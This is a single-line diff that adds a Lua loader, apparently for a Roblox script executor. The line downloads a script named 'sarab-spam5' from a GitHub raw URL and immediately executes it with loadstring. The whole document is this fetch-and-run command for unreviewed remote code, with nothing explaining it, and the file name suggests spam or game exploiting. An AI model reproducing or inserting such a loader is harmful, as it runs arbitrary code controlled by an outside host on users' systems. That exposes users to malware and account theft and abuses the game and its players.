@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/sarab-spam5-d7eqrezmj1rxkx.lua"))()
